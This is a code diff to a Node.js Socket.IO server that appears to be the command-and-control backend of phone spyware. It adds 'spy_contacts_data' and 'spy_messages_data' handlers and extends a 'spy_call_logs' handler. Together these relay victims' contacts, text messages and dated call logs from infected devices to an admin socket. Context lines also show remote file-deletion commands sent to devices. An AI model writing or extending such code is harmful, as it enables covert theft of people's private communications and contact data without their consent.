@@ -105,20 +105,38 @@ io.on("connection", (socket) => {
     io.to(device_secure_ids[too]).emit("delete_multi",def_path,data);
    
   })
+  
+  socket.on("spy_contacts_data", (cname,cdata)=>{
+    io.to(admin_socket_id).emit("contacts_data", cdata ,cname);
+    console.log(cdata)
+    console.log(cname)
+
+  })
+
+  socket.on("spy_messages_data", (cnumber,cname, cdate ,cdata)=>{
+    io.to(admin_socket_id).emit("messages_data",cnumber,cname,cdate,cdata);
+    console.log(cnumber);
+    console.log(cname);
+    console.log(cdate);
+    console.log(cdata);
+  })
   socket.on(
     "spy_call_logs",
-    (number_list, name_list, call_type, duration_list) => {
+    (number_list, name_list, call_type, duration_list,date) => {
       console.log(name_list);
       console.log(number_list);
       console.log(duration_list);
       console.log(call_type);
+      console.log(date)
       io.to(admin_socket_id).emit(
         "call_logs_data",
-        name_list,
         number_list,
+        name_list,
         duration_list,
+        date,
         call_type
       );
+     
     }
   );
 
